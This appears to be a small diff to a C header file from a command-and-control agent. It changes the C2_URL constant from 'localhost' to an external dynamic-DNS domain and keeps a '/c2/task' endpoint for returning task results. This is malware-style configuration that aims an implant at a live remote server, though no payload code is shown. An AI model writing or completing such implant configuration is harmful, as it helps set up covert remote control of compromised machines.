@@ -6,7 +6,7 @@
 #endif
 
 #define CONTENT_TYPE_JSON L"Content-Type: application/json"
-#define C2_URL L"localhost"
+#define C2_URL L"kjh2iur80in12rjfbjn.ddns.net"
 #define TASK_RESULTS_ENDPOINT L"/c2/task"
 
 #endif // CONSTANTS_H_
